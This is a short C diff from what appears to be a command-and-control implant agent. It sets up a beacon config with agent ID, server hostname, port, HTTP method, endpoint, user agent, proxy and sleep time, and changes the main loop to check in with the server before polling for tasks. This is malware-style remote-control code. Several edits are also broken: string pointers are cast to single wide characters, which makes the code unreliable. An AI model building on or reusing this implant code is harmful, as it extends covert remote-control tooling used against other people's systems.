@@ -4,26 +4,26 @@
 CONFIG_CORN corn_config = {0}; // initial
 
 int setupAgentConfig(void){
-    corn_config.AgentID = (PCHAR)initUUID;
-    corn_config.HostName = (PWCHAR)hostname;
+    memcpy(corn_config.AgentID, initUUID, 36);
+    corn_config.HostName = (WCHAR)hostname;
     corn_config.HttpPort = (DWORD)httpport;
-    corn_config.HttpMethod = (PWCHAR)httpmethod;
-    corn_config.EndPoint = (PWCHAR)endpoint;
-    corn_config.UserAgent = (PWCHAR)useragent;
+    corn_config.HttpMethod = (WCHAR)httpmethod;
+    corn_config.EndPoint = (WCHAR)endpoint;
+    corn_config.UserAgent = (WCHAR)useragent;
     corn_config.IsSSL = (BOOL)isssl;
     corn_config.IsProxyEnabled = (BOOL)proxyenabled;
-    corn_config.ProxyURL = (PWCHAR)proxyurl;
+    corn_config.ProxyURL = (WCHAR)proxyurl;
     corn_config.SleepTime = (UINT32)sleeptime;
 }
 
 int main(void){
     // TODO コールバックuuidの登録
-    PParser initTask = sendCheckin();
-    PCommand cmd = tlvReadField(initTask);
-    dispatchCommand(cmd);
+    if(!sendCheckin(&corn_config)){
+      return -1;
+    }
 
     // first sleep
-    sleep(corn_config.SleepTime);
+    Sleep(corn_config.SleepTime);
 
 
     PPackage prevResults = NULL;
@@ -41,7 +41,7 @@ int main(void){
         freePackage(package);
 
         if(parser == NULL){
-        sleep(corn_config.SleepTime);
+        Sleep(corn_config.SleepTime);
         continue;
         }
 
